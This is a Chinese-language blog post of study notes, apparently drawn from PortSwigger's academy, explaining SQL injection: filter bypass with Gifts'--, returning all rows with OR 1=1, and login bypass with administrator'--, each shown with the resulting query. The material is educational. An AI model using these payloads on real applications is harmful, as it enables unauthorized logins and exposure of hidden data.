---
title: Port_Swigger学习笔记
date: 2022-04-18 10:04:03
tags:
---

## 检索隐藏数据

考虑一个显示不同类别产品的购物应用程序。当用户点击礼物类别时，他们的浏览器会请求 URL：

```
https://insecure-website.com/products?category=Gifts
```

这会导致应用程序进行 SQL 查询以从数据库中检索相关产品的详细信息：

```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

此 SQL 查询要求数据库返回：

- 所有详细信息 (*)
- 从产品表
- 其中类别是礼物
- 并释放为 1。

该限制`released = 1`用于隐藏未发布的产品。对于未发布的产品，大概是`released = 0`.

该应用程序没有实施任何针对 SQL 注入攻击的防御措施，因此攻击者可以构建如下攻击：

```
https://insecure-website.com/products?category=Gifts'--
```

这将导致 SQL 查询：

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

这里的关键是双破折号序列`--`是 SQL 中的注释指示符，意味着查询的其余部分被解释为注释。这有效地删除了查询的其余部分，因此它不再包括`AND released = 1`. 这意味着显示所有产品，包括未发布的产品。

更进一步，攻击者可以使应用程序显示任何类别的所有产品，包括他们不知道的类别：

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

这将导致 SQL 查询：

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

修改后的查询将返回类别为礼物或 1 等于 1 的所有项目。由于`1=1`始终为真，因此查询将返回所有项目。



## 颠覆应用逻辑

考虑一个允许用户使用用户名和密码登录的应用程序。如果用户提交用户名`wiener`和密码`bluecheese`，应用程序通过执行以下 SQL 查询来检查凭据：

```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

如果查询返回用户的详细信息，则登录成功。否则，它被拒绝。

在这里，攻击者只需使用 SQL 注释序列从查询子句中`--`删除密码检查，即可以任何没有密码的用户身份登录。`WHERE`例如，提交用户名`administrator'--`和空白密码会导致以下查询：

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

此查询返回用户名是的用户，`administrator`并成功地将攻击者作为该用户登录。



